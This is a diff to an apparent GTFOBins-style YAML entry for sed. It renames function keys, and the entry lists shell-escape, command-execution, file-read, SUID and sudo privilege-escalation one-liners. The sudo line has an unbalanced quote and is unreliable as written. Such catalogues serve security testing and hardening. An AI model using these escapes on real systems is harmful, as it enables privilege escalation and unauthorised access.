@@ -1,9 +1,9 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - description: GNU version only. Also, this requires `bash`.
       code: sed -n '1e exec sh 1>&0' /etc/hosts
-  execute-non-interactive:
+  command:
     - description: GNU version only.
       code: sed -n "1e id" /etc/hosts
   file-write:
@@ -14,11 +14,11 @@ functions:
     - code: |
         LFILE=file_to_read
         sed '' "$LFILE"
-  suid-enabled:
+  suid:
     - code: |
         LFILE=file_to_read
         ./sed -e '' "$LFILE"
-  sudo-enabled:
+  sudo:
     - description: GNU version only. Also, this requires `bash`.
       code: sudo sed -n '1e exec sh 1>&0 /etc/hosts
 ---
